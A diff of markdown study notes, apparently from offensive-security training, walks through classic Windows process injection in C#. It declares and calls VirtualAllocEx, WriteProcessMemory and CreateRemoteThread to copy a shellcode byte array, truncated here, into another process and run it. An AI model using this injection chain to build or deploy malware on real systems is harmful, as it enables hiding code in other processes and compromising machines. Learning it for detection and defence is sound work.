@@ -266,7 +266,7 @@ IntPr hProcess = OpenProcess(0x001F0FFF, false, 4804)
 
 ### VirtualAllocEx API
 
-In the previous VirtualAlloc shellcode runner, used to locate memory for your shellcode. However this **only works in current process**.  
+> In the previous VirtualAlloc shellcode runner, used to locate memory for your shellcode. However this **only works in current process**.  
 *VirtualAllocEx* can perform actions in any process that we can have a valid handle to.
 
 ```csharp
@@ -297,8 +297,70 @@ IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
 ### WriteProcessMemory
 
-Allow to copy data into remote process. The previous *RtlMoveMemory* and c# methods do not support remote copy.
+> Allow to copy data into remote process. The previous *RtlMoveMemory* and c# methods do not support remote copy.
+
+```csharp
+[DllImport("kernel32.dll")]
+static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+```
+#### Arguments
+```
+BOOL WriteProcessMemory(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+```
+
+- *hProess*,the handle we get from *OpenProcess*
+- *lpBaseAddress*, the newly allocated address we get from *VirtualAllocEx* 
+- *lpBuffer*, the shellcode array
+- *nSize*, the shellcodesize
+- *lpNumberOfBytsWritten*, output how much data was copied
+
+```csarp
+byte[] buf = new byte[626] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc...
+
+IntPtr outSize;
+WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+```
+
 
 ## CreateRemoteThread
 
+```
+[DllImport("kernel32.dll")]
+static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, 
+    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, 
+        IntPtr lpThreadId);
+```
+
 *CreateThread* does not support creation of remote process threads, rely on *CreateRemoteThread* instead
+
+
+#### Arguments
+
+```
+HANDLE CreateRemoteThread(
+  HANDLE                 hProcess,
+  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+  SIZE_T                 dwStackSize,
+  LPTHREAD_START_ROUTINE lpStartAddress,
+  LPVOID                 lpParameter,
+  DWORD                  dwCreationFlags,
+  LPDWORD                lpThreadId
+);
+```
+
+Accept 7 argument, but will ognore those aren't required.
+
+- *hProcess*, As usual, this is the *openProcess* handle
+- *lpThreadAttributes* and *dwStackSize* will set to 0 to accept default value.
+- *lpStartAddress*, specified the starting address of the thread
+-  The next 3 we can ignore and put it as 0 or null
+
+```csharp
+IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+```
